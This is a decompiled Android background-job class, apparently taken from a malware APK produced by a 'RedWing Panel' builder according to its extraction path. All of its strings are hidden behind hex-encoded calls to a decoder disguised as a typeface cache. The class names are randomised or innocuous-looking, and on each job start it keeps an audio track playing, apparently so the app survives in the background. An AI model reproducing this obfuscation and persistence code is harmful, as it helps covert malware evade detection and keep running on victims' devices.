package app.mobilex.plus.services;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.media.AudioTrack;
import app.mobilex.plus.util.TypefaceCache;
import v.s.kExylgSxUDTVQOx3o0oq;
import v.s.y6jRGLEWNMir;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class DataBVTask extends JobService {
    public static final /* synthetic */ int dDIMxZXP1V8HdM = 0;

    static {
        TypefaceCache.obtain("00070077004F008600D2008900E600A60030007D");
    }

    private static /* synthetic */ void nfjdwvvzth() {
    }

    @Override // android.app.job.JobService
    public final boolean onStartJob(JobParameters jobParameters) {
        AudioTrack audioTrack;
        TypefaceCache.obtain("00080073005E009700D100B300DB00B1002600360051008800F200FF00C600B5002A0071005C008200E200BA00D6");
        String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
        y6jRGLEWNMir.Qrz92kRPw4GcghAc(this, TypefaceCache.obtain("00090059007900B800DB009A00F700970002005A007200B100D5"));
        y6jRGLEWNMir.l1V0lQr6TbwNKqHfXNbb(this);
        kExylgSxUDTVQOx3o0oq kexylgsxudtvqox3o0oq = kExylgSxUDTVQOx3o0oq.dDIMxZXP1V8HdM;
        if (kExylgSxUDTVQOx3o0oq.vekpFI4d1Nc4fakF && (audioTrack = kExylgSxUDTVQOx3o0oq.w9sT1Swbhx3hs) != null && audioTrack.getPlayState() == 3) {
            return false;
        }
        TypefaceCache.obtain("00160066005F008600E400BA00EB0083001400790049008C00F500AD009200A300260077005F00CB00B000AD00D700B4003700770049009300F900B100D500E7002500640054008A00B0009400D700A2003300570057008E00E600BA");
        try {
            kexylgsxudtvqox3o0oq.w9sT1Swbhx3hs(this);
            return false;
        } catch (Exception e) {
            TypefaceCache.obtain("0010007F0057008200FE00AB00F300B20027007F005400C700E200BA00C100B300220064004F00C700F500AD00C000A80031002C001B");
            e.getMessage();
            return false;
        }
    }

    @Override // android.app.job.JobService
    public final boolean onStopJob(JobParameters jobParameters) {
        TypefaceCache.obtain("00080073005E009700D100B300DB00B1002600360051008800F200FF00C100B3002C0066004B008200F4");
        return true;
    }
}
